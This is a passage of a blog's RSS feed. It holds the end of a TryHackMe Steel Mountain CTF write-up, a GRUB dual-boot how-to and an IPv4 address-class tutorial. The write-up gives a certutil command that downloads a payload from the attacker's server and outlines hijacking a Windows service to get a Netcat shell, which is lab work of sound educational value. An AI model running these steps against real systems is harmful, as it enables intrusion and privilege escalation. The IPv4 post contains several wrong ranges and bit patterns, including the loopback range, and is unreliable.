certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}
{% endhighlight %}

&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg){:.normal}&lt;br&gt;&lt;br&gt;
As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on **Advanced System Care9**
service and many others.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg){:.normal}&lt;br&gt;&lt;br&gt;
You will need to repeat previous steps to get the root flag. Download **Advanced.exe** with &lt;br&gt;**Invoke-WebRequest** or
**certutil**, start a Netcat listener and restart the service.
&lt;br&gt;
&lt;br&gt;
That is the end for this machine, wish you more penetrations ;)
</description>
        <pubDate>Wed, 22 Dec 2021 21:50:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>remote-code-execution</category>
        
        <category>windows-privesc</category>
        
        <category>powershell</category>
        
        <category>metasploit</category>
        
        <category>unqoted-service-path</category>
        
        
      </item>
    
      <item>
        <title>Add Windows Boot Manager to Grub</title>
        <description>If you want to add windows boot manager to grub, follow these steps;

1-Download **os-prober**&lt;br&gt;
2-Run:
{% highlight bash %}
sudo os-prober
{% endhighlight %}
If there is an output like that, you are good to go:
{% highlight bash %}
-&gt; sudo os-prober
/dev/nvme1n1p1@/EFI/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi
{% endhighlight %}
&lt;br&gt;
3- Append this line, **GRUB_DISABLE_OS_PROBER=false**, to the **/etc/default/grub** file.&lt;br&gt;
4- Run: 
{% highlight bash %}
sudo grub-mkconfig -o /boot/grub/grub.cfg
{% endhighlight %}
&lt;br&gt;
Done ! You will see all bootable system in your grub menu at the next boot.
</description>
        <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</guid>
        
        <category>linux</category>
        
        <category>windows</category>
        
        <category>grub</category>
        
        <category>boot-managers</category>
        
        
      </item>
    
      <item>
        <title>IPv4 Protocol</title>
        <description>## IPv4

IPv4 stands for Internet Protocol version 4. IPs are addresses for users on the internet. Messages and packages delivered via
IP addresses. IPv4 address spaces consists of four octets. Depending on the class and configuration, some portion of bits in the
octet represents the network ID, while the rest represents hosts.
&lt;br&gt;&lt;br&gt;
An IP address consists of 4 octets, which
determines the class and configuration of a network, for example you can think of an IP address as Octet1.Octet2.Octet3.Octet4
&lt;br&gt;&lt;br&gt;
There are 5 IPv4 classes that determines which portion of the network is usable for devices you want to connect and how much of
them are allowed. Each has its own usable address spaces for maximum range of devices.
### CLASS A

Class A type is for big scale network insfrastructures with large number of total hosts needed.By using the first octet for the
network ID, class A grants for 126 networks with 16,777,214 hosts per network. The first bit in the first octet is always zero, the rest of the
7 bits creates different network ID&apos;s when they are turned on.

|:-------|:-------|
|Network Bits: first octet|Host Bits:last three octets|

|:-------|:-------|:-------|:-------|
|01111111|00000000|00000000|00000000|

* Public IP Range: 1.0.0.0 to 127.0.0.0
    * Range for first octet value from 1 to 127
* Private IP Range: 10.0.0.0 10.255.255.255
* Number of networks: 126
* Number of hosts: 16,777,214
* Subnet Mask: 255.0.0.0 (8 bits) 

### CLASS B 
Class B type is for medium to large-sized networks. By using the first two octets for the network ID, class B grants for
16,382 networks with 65,534 hosts per network. The first two bits of the first octet are always 1 and 0, the rest of the 14 bits 
creates different network ID&apos;s when they are turned on.

|:-------|:-------|
|Network Bits: first two octets|Host Bits: last two octets|

|:-------|:-------|:-------|:-------|
|10111111|11111111|00000000|00000000|

* Public IP Range: 128.0.0.0 to 192.255.0.0
    * Range for first octet value from 128 to 191 
* Private IP Range: 172.16.0.0 to 172.31.255.255
* Subnet Mask: 255.255.0.0 (16 bits)
* Number of networks: 16,382
* Number of hosts: 65,534

### CLASS C
Cass C type is for small-sized local area networks (LANs). By using the first three octets for the network ID, class C grants for
2,097,150 networks with 254 hosts per network. The first three bits of the first are always 1 1 0, the rest of the 21 bits creates
different network ID&apos;s when they are turned on.


|:-------|:-------|
|Network Bits: first three octets|Host Bits: last octet|

|:-------|:-------|:-------|:-------|
|11011111|11111111|11111111|00000000|

* Public IP Range: 192.0.0.0 to 223.255.255.0
    * Range for first octet value from 192 to 223 
* Private IP Range: 192.168.0.0 to 192.168.255.255
* Special IP Range: 127.0.0.1 to 127.255.255.255
* Subnet Mask: 255.255.255.0 (24 bits)
* Number of networks: 2,097,150
* Number of hosts: 254

### CLASS D
Class D type is not for hosts and used for multicasting. In order to send a stream of data  to thousands of nodes across the 
Internet concurrently, multicasting is required. Mostly used for video, audio streaming and broadcast any kind of altered global
data to the institutions or organizations, for example currency rate information.

* Range 224.0.0.0 to 230.255.255.255
    * First octet value range from 224 to 239
* Number of Networks: NULL
* Number of Hosts per Network: Network Multicasting

### CLASS E

Class E type is reserved addresses for research purposes (NASA etc.), and not available for regular users.

* Range 240.0.0.0 255.255.255.255
    * First octet value range from 244 to 255
* Number of Networks: NULL
* Number of Hosts per Network: Experimental/Reserved/Research

## PRIVATE IP ADDRESSES

Within every and each network class, there are specified IP addresses that are specifically reserved for internal/private use 
only. These IP addresses cannot use internet as they are not routeable and ensure internal communication. For instance, 
FTP and web servers have to use public IP addresses instead of private. However, within a business or a home network, 
private IP addresses leased to the devices.  

* **Class A Private Range**: from 10.0.0.0 to 10.255.255.255 
Class B APIPA Private Range: from 169.254.0.0 to 169.254.255.255
    * In general, a Dynamic Host Configuration Protocol (DHCP) server is used to lease IP addresses to any woken device within 
the network. However, if there is not one, or the device is not configured properly for DHCP offer, Automatic Private IP Addressing
(APIPA) is used to assign a private IP address to the device in question **if it is a Microsoft-based device**.

* **Class B Private Range**: from 172.16.0.0 172.31.255.255
* **Class C Private Range**: from 192.168.0.0 to 192.168.255.255

## SPECIAL IP ADDRESSES

IP Range from 127.0.0.1 to 172.255.255.255 are used for network testing, which also referred as loop-back addresses. These are
virtual IP addresses and can not be assigned to a device as a logical address. 
&lt;br&gt;&lt;br&gt;
The most common one is **127.0.0.1**
, which is repeatedly used to troubleshoot the network connectivity issues using the ICMP protocol. If
there is a connectivity issue, before checking for network infrastructures or the other nodes, making sure of the TCP/IP stack
is correctly working on that machine must be prior check as the ICMP packet that you sent to that special IP address tests each
layer. If ping responses with a packet loss, then the connectivity issue is on the local computer, you would need to resolve
this first. If there is no packet loss, you can start to explore other possibilities that may cause failure.
</description>
        <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2021/11/18/ipv4-addresses/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/11/18/ipv4-addresses/</guid>
        
        <category>network protocols</category>
        
        <category>ip-addresses</category>
        
        
      </item>
    
  </channel>
</rss>
